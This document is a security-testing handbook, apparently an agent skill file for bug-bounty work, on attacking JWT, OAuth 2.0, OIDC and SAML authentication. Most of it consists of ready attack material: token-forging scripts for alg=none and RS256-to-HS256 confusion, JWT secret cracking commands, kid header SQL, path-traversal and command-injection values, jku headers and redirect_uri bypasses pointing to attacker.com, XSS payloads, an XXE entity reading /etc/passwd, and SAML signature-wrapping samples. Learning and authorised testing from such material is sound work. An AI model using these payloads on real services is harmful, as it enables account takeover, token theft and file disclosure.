> Structure: the upper half is the original core content (JWT / OAuth / SAML); the lower half adds depth by skill — api-auth / jwt-oauth / oidc / saml. Just search by heading.
>
> Cross-origin token reads: SRC hunting does not cover CORS, **do not open** `cors-test.md`. For cross-site writes go to `csrf-test.md`, for unauthorized reads go to `idor-test.md`.

## 1. Original Knowledge Base

# OAuth/JWT/SAML Security Testing Handbook

## 1. JWT Testing

### 1.1 Algorithm Confusion Attack

```python
import jwt
import base64

# Original JWT
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"

# Attack 1: alg=none (remove signature)
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin"}
fake_token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') + '.' + \
             base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') + '.'

# Attack 2: RS256 → HS256 (use the public key as the HMAC secret)
# 1. Obtain the public key (from /jwks.json or the certificate)
# 2. Sign using the public key as the HS256 secret
public_key = open('public.pem', 'rb').read()
fake_token = jwt.encode({"user": "admin"}, public_key, algorithm='HS256')
```

### 1.2 Secret Brute Force

```bash
# jwt_tool brute force
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# hashcat brute force
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
```

### 1.3 kid Injection

```python
# The kid (Key ID) parameter may be injectable
# SQL injection
header = {
    "alg": "HS256",
    "kid": "1' UNION SELECT 'secret'--"
}

# Path traversal
header = {
    "alg": "HS256",
    "kid": "../../../../../../dev/null"  # Empty file used as the key
}

# Command injection
header = {
    "alg": "HS256",
    "kid": "key.txt; whoami"
}
```

### 1.4 jku/x5u Header Tampering

```python
# jku: JWK Set URL (points to an attacker-controlled server)
header = {
    "alg": "RS256",
    "jku": "https://attacker.com/jwks.json",
    "kid": "attacker-key"
}

# jwks.json hosted on the attacker's server
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "...",  # attacker's public key
      "e": "AQAB"
    }
  ]
}

# Sign the JWT with the attacker's private key
```

### 1.5 exp Expiration Time Tampering

```python
import jwt
import time

# Modify exp to a future time
payload = {
    "user": "admin",
    "exp": int(time.time()) + 86400 * 365  # expires in 1 year
}

# If the server does not verify the signature, simply modify the payload
```

### 1.6 Signature Stripping

```bash
# Remove the signature portion, keeping only header.payload.
# Some implementations may not check whether a signature exists

# Original: eyJhbGci...header.eyJ1c2Vy...payload.c2lnbmF0dXJl...signature
# Modified: eyJhbGci...header.eyJ1c2Vy...payload.
```

---

## 2. OAuth 2.0 Testing

### 2.1 redirect_uri Bypass

```bash
# Original authorization URL
https://oauth.target.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=read

# Bypass method 1: subdirectory
redirect_uri=https://target.com/callback/../../attacker.com

# Bypass method 2: subdomain
redirect_uri=https://attacker.target.com/callback

# Bypass method 3: parameter pollution
redirect_uri=https://target.com/callback?next=https://attacker.com

# Bypass method 4: open redirect chain
redirect_uri=https://target.com/redirect?url=https://attacker.com

# Bypass method 5: domain confusion
redirect_uri=https://target.com.attacker.com
redirect_uri=https://target.com@attacker.com
redirect_uri=https://target.com%2eattacker.com

# Bypass method 6: protocol confusion
redirect_uri=javascript:alert(document.domain)
redirect_uri=data:text/html,<script>alert(1)</script>
```

### 2.2 state Parameter Testing

```bash
# Test 1: missing state parameter
# Remove the state parameter and observe whether authorization still completes → CSRF risk

# Test 2: predictable state
# Authorize multiple times and observe whether state follows a pattern (incrementing, timestamps, etc.)

# Test 3: state replay
# Re-authorize using a state value that has already been used
```

### 2.3 Authorization Code Replay

```bash
# 1. Complete an authorization flow and obtain a code
# 2. Exchange the code for an access_token
# 3. Exchange the same code for a token again
# If it succeeds → the authorization code is replayable

curl -X POST "https://oauth.target.com/token" \
  -d "grant_type=authorization_code" \
  -d "code=USED_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/callback"
```

### 2.4 scope Escalation

```bash
# Request with scope=read
# After authorization, modify the scope when exchanging the code for a token

curl -X POST "https://oauth.target.com/token" \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/callback" \
  -d "scope=read write admin"  # escalate privileges
```

### 2.5 Implicit Flow Token Leakage

```bash
# Implicit Flow returns the token directly in the URL fragment
https://target.com/callback#access_token=TOKEN&token_type=Bearer

# Risks:
# 1. Referer leakage (when visiting external links)
# 2. Browser history
# 3. Log records

# Test: insert an external resource on the callback page
<img src="https://attacker.com/log">
# Check whether attacker.com logs receive a Referer containing the token
```

### 2.6 Missing PKCE Test

```bash
# PKCE (Proof Key for Code Exchange) prevents authorization code interception

# Test: do not send code_challenge and code_verifier
# 1. Authorize without code_challenge
# 2. Exchange the token without code_verifier
# If it still succeeds → PKCE is not enforced
```

### 2.7 client_secret Leakage

```bash
# Check JS source code
grep -r "client_secret" *.js
grep -r "clientSecret" *.js

# Check mobile APK
apktool d app.apk
grep -r "client_secret" app/

# Check Git history
git log -p | grep -i "client_secret"
```

---

## 3. SAML Testing

### 3.1 Signature Bypass (XML Signature Wrapping Attack)

```xml
<!-- Original SAML Response -->
<samlp:Response>
  <Assertion ID="original">
    <Subject>
      <NameID>victim@example.com</NameID>
    </Subject>
    <Signature>...</Signature>
  </Assertion>
</samlp:Response>

<!-- Attack: insert a malicious Assertion -->
<samlp:Response>
  <Assertion ID="evil">
    <Subject>
      <NameID>attacker@example.com</NameID>
    </Subject>
  </Assertion>
  <Assertion ID="original">
    <Subject>
      <NameID>victim@example.com</NameID>
    </Subject>
    <Signature>...</Signature>
  </Assertion>
</samlp:Response>

<!-- If the app reads the first Assertion but verifies the second signature → bypass -->
```

### 3.2 Assertion Tampering

```xml
<!-- Modify the NameID -->
<NameID>admin@example.com</NameID>

<!-- Modify attributes -->
<Attribute Name="role">
  <AttributeValue>admin</AttributeValue>
</Attribute>

<!-- Modify the expiration time -->
<Conditions NotBefore="2020-01-01" NotOnOrAfter="2030-01-01">
```

### 3.3 XXE Injection

```xml
<!-- Inject XXE into the SAML request -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:AuthnRequest>
  <Issuer>&xxe;</Issuer>
</samlp:AuthnRequest>
```

### 3.4 Comment Injection Truncation

```xml
<!-- Use XML comments to truncate signature validation -->
<NameID>victim@example.com<!--</NameID>
<NameID>attacker@example.com</NameID>-->
```

---

## 4. Testing Tools

### jwt_tool

```bash
# Install
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py -h

# Scan for all vulnerabilities
python3 jwt_tool.py <JWT> -M at

# Brute-force the secret
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# Tamper with the payload
python3 jwt_tool.py <JWT> -T
```

### Burp Plugins

```
- JSON Web Tokens (JWT4B)
- SAML Raider
- OAuth Scanner
```

### Python Script Example

```python
import requests
import jwt

# JWT testing
def test_jwt_none_alg(token):
    """Test the alg=none attack"""
    header, payload, sig = token.split('.')
    
    # Decode the payload
    import base64, json
    payload_data = json.loads(base64.urlsafe_b64decode(payload + '=='))
    
    # Construct an alg=none token
    new_header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).decode().rstrip('=')
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload_data).encode()
    ).decode().rstrip('=')
    
    fake_token = f"{new_header}.{new_payload}."
    
    # Test
    r = requests.get("https://target.com/api/me",
                     headers={"Authorization": f"Bearer {fake_token}"})
    return r.status_code == 200

# OAuth redirect_uri testing
def test_redirect_uri_bypass(auth_url, payloads):
    """Test redirect_uri bypass"""
    for payload in payloads:
        test_url = auth_url.replace(
            "redirect_uri=https://target.com/callback",
            f"redirect_uri={payload}"
        )
        print(f"Testing: {payload}")
        # Manually visit test_url to observe whether it redirects to the attacker's domain
```

---

## 2. Supplement: api-auth-and-jwt-abuse

### api-auth-and-jwt-abuse

### API Auth and JWT Abuse — Token Trust, Header Tricks, and Rate Limits

## 1. TOKEN TRIAGE

Inspect:

- `alg`, `kid`, `jku`, `x5u`
- role, org, tenant, scope, or privilege claims
- issuer and audience mismatches
- reuse of mobile and web tokens across products

## 2. QUICK ATTACK PICKS

| Pattern | First Test |
|---|---|
| `alg:none` acceptance | unsigned token with trailing dot |
| RS256 confusion | switch to HS256 using public key as secret |
| `kid` lookup trust | path traversal or injection in `kid` |
| remote key fetch trust | attacker-controlled `jku` or `x5u` |
| weak secret | offline crack with targeted wordlists |

## 3. HIDDEN FIELDS AND BATCH ABUSE

### Mass assignment field picks

```text
role
isAdmin
admin
verified
plan
tier
permissions
org
owner
```

### Rate limit and batch abuse picks

```text
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
Forwarded: for=9.9.9.9
```

GraphQL or JSON batch abuse candidates:

- arrays of login mutations
- bulk object fetches with varying IDs
- repeated password reset or verification calls in one request

## 4. RATE LIMIT BYPASS FAMILIES

```text
X-Forwarded-For
X-Real-IP
Forwarded
User-Agent rotation
Path case / slash variants
```

## 5. NEXT ROUTING

- For GraphQL batching and hidden parameters: [graphql and hidden parameters](graphql-test.md)
- For default credential and brute-force planning: [authentication bypass](authbypass-test.md)
- For full JWT and OAuth depth: [jwt oauth token attacks](oauth-jwt-test.md)
- For OAuth or OIDC configuration flaws in browser and SSO flows: [oauth oidc misconfiguration](oauth-jwt-test.md)
- Cross-origin token reads: SRC hunting does not cover CORS, **do not open** `cors-test.md`. For cross-site writes go to `csrf-test.md`, for unauthorized reads go to `idor-test.md`

---

## Supplement: jwt-oauth-token-attacks

### jwt-oauth-token-attacks

### JWT and OAuth 2.0 Token Attacks


## 1. JWT ANATOMY

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE
```

**Decode in terminal**:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
### → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
### → {"userId":1234,"role":"user"}
```

**Common claim targets** (modify to escalate):
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

Server doesn't validate signature when algorithm is "none"/"None"/"NONE":

```bash
### Burp JWT Editor / python-jwt attack:
### Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

### Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

### Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

### Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
### OR:
HEADER.PAYLOAD
```

**Tool (jwt_tool)**:
```bash
python3 jwt_tool.py JWT_TOKEN -X a
### → automatically generates alg:none variants
```

---

## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

```bash
### Step 1: Obtain public key (PEM format)
### From: /api/.well-known/jwks.json → convert to PEM
### From: /certs endpoint
### From: OpenSSL extraction from HTTPS cert

### Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

### Step 3: Manually:
### Modify header: {"alg":"HS256","typ":"JWT"}
### Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```

---

## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

HMAC-based JWTs (HS256/HS384/HS512) with weak secret:

```bash
### hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

### john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

### jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**Common weak secrets to test manually**:
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---

## 5. ATTACK 4 — kid (Key ID) INJECTION

The `kid` header parameter specifies which key to use for verification. No sanitization = injection:

### kid SQL Injection
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`  
Result: HMAC key = `'attacker_controlled_key'` → forge any payload signed with this value.

### kid Path Traversal (file read)
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
Server reads `/dev/null` as key → empty string → sign token with empty HMAC.

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
Server reads hostname as key → forge tokens signed with hostname string.

---

## 6. ATTACK 5 — jku / x5u Header Injection

`jku` points to JSON Web Key Set URL. If not whitelisted:
```json
{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
```

**Setup**:
```bash
### Generate RSA key pair:
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

### Create JWKS:
python3 -c "
import json, base64, struct
### ... (use python-jwcrypto or jwt_tool to export JWKS)
"

### Host malicious JWKS at attacker.com/malicious-jwks.json
### Sign JWT with attacker's private key
### Server fetches attacker's JWKS → verifies with attacker's public key → accepts
```

**jwt_tool automation**:
```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
```

---

## 7. OAUTH 2.0 — STATE PARAMETER MISSING (CSRF)

State parameter prevents CSRF in OAuth. If missing:

```
Attack:
1. Click "Login with Google" → OAuth starts → intercept the redirect URL:
   https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=...

2. Get the authorization code (stop before exchanging it)
3. Craft URL: https://target.com/oauth/callback?code=ATTACKER_CODE
4. Victim clicks that URL → their session binds to ATTACKER's OAuth identity
→ ACCOUNT TAKEOVER
```

---

## 8. OAUTH — REDIRECT_URI BYPASS

Authorization codes are sent to `redirect_uri`. If validation is weak:

### Open Redirect in redirect_uri
```
Original: redirect_uri=https://target.com/callback
Attack:   redirect_uri=https://target.com/callback/../../../attacker.com
          redirect_uri=https://attacker.com.target.com/callback
          redirect_uri=https://target.com@attacker.com/callback
```

### Partial Path Match
```
Whitelist: https://target.com/callback
Attack: https://target.com/callback%2f../admin (URL path confusion)
        https://target.com/callbackXSS (prefix match only)
```

### Localhost / Development Redirect
```
redirect_uri=http://localhost/steal
redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)
```

---

## 9. OAUTH — IMPLICIT FLOW TOKEN THEFT

Implicit flow: token sent in URL fragment `#access_token=...`

**Fragment leakage scenarios**:
- Redirect to attacker page: fragment accessible via `document.referrer` or via `<script>window.location.href</script>` in target page
- Open redirect: `redirect_uri=https://target.com/open-redirect?url=https://attacker.com` → token in fragment lands at attacker's page

---

## 10. OAUTH — SCOPE ESCALATION

Request broader scope than authorized in authorization code:
```
Authorized scope: read:profile
Attack: During token exchange, add scope=admin or scope=read:admin
→ Does server grant requested scope or issued scope?
```

---

## 11. TOKEN LEAKAGE VECTORS

### Referer Header
Token in URL → page loads external resource → Referer leaks token:
```
https://target.com/dashboard#access_token=TOKEN
→ HTML loads: <img src="https://analytics.third-party.com/track">
→ Referer: https://target.com/dashboard#access_token=TOKEN
→ analytics.third-party.com sees token in Referer logs
```

### Server Logs
Access tokens sent in query parameters are stored in:
```
/var/log/nginx/access.log
/var/log/apache2/access.log
ELB/ALB logs (AWS)
CloudFront logs
CDN logs
```

---

## 12. JWT TESTING CHECKLIST

```
□ Decode header + payload (base64 decode each part)
□ Identify algorithm: HS256/RS256/ES256/none
□ Modify payload fields (role, userId, isAdmin) → change signature too
□ Test alg:none → remove signature entirely
□ If RS256: find public key → attempt RS256→HS256 confusion
□ If HS256: brute force with hashcat/rockyou
□ Check kid parameter → try SQL injection + path traversal
□ Check jku/x5u header → redirect to attacker JWKS
□ Never call logout on user-provided sessions; do not test "session still alive after logout". Self-registered/anonymous test accounts may be used to test whether the ticket is invalidated after logout
□ Test expired token acceptance (exp claim)
□ Check for token in GET params (log leakage) vs header
```

---

## 13. OAUTH TESTING CHECKLIST

```
□ Check for state parameter in authorization request
□ Test redirect_uri manipulation (open redirect, prefix match, path confusion)
□ Can tokens be exchanged more than once?
□ Test scope escalation during token exchange
□ Implicit flow: check for token in Referer/history
□ PKCE: can code_challenge be bypassed or code_verifier be empty?
□ Check for authorization code reuse (code must be single-use)
□ Test account linking abuse: link OAuth to existing account with same email
□ Check OAuth provider confusion: use Apple ID to link where Google expected
```

---

## Supplement: oauth-oidc-misconfiguration

### oauth-oidc-misconfiguration

### OAuth and OIDC Misconfiguration — Redirects, PKCE, Scopes, and Token Binding

## 1. WHEN TO LOAD THIS SKILL

Load when:

- The app supports `Login with Google`, GitHub, Microsoft, Okta, or other IdPs
- You see `authorize`, `callback`, `redirect_uri`, `code`, `state`, `nonce`, or `code_challenge`
- Mobile or SPA clients rely on OAuth or OIDC flows

For token cryptography and JWT header abuse, also load:

- [jwt oauth token attacks](oauth-jwt-test.md)

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| `state` handling | missing, static, predictable, or not bound to user session |
| `redirect_uri` validation | prefix match, open redirect chaining, path confusion, localhost leftovers |
| PKCE | missing for public clients, code verifier not enforced, downgraded flow |
| OIDC `nonce` | missing or not validated on ID token return |
| token audience and issuer | weak `aud` / `iss` checks, cross-client token reuse |
| account binding | callback binds attacker identity to victim session |
| scope handling | broader scopes granted than the user or client should receive |

## 3. QUICK TRIAGE

1. Map the full flow: authorize, callback, token exchange. Do not test logout on user-provided sessions.
2. Replay callback flows with altered `state`, `nonce`, and `redirect_uri`.
3. Compare SPA, mobile, and web clients for weaker validation.
4. Check whether one provider account can be rebound to another local account.

## 4. RELATED ROUTES

- Cross-origin token reads: SRC hunting does not cover CORS, **do not open** `cors-test.md`. For cross-site writes go to `csrf-test.md`, for unauthorized reads go to `idor-test.md`
- XML federation or enterprise SSO: [saml sso assertion attacks](oauth-jwt-test.md)
- CSRF-heavy login or binding bugs: [csrf cross site request forgery](csrf-test.md)

---

## Supplement: saml-sso-assertion-attacks

### saml-sso-assertion-attacks

### SAML SSO and Assertion Attacks — Signature Validation, Binding, and Trust Confusion

## 1. WHEN TO LOAD THIS SKILL

Load when:

- Enterprise SSO uses SAML requests or responses
- You see `SAMLRequest`, `SAMLResponse`, XML assertions, or ACS endpoints
- Login flows involve an external IdP and browser POST/redirect binding

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| signature validation | unsigned assertion accepted, wrong node signed, signature wrapping |
| audience and recipient | weak `Audience`, `Recipient`, `Destination`, or ACS validation |
| issuer trust | wrong IdP accepted or multi-tenant issuer confusion |
| replay and freshness | missing `InResponseTo`, weak `NotBefore` / `NotOnOrAfter` enforcement |
| account mapping | email-only binding, case folding, unverified attributes |
| XML parser behavior | XXE-like parser issues or unsafe transforms around SAML documents |

## 3. QUICK TRIAGE

1. Capture one full login round trip.
2. Inspect which XML nodes are signed and which attributes drive account binding.
3. Compare SP-initiated and IdP-initiated flows.
4. Test replay, altered attributes, and assertion placement confusion.

## 4. RELATED ROUTES

- XML parser attack depth: [xxe xml external entity](xxe-test.md)
- OAuth or OIDC SSO alternatives: [oauth oidc misconfiguration](oauth-jwt-test.md)
- Auth boundary issues after SSO: [authbypass authentication flaws](authbypass-test.md)
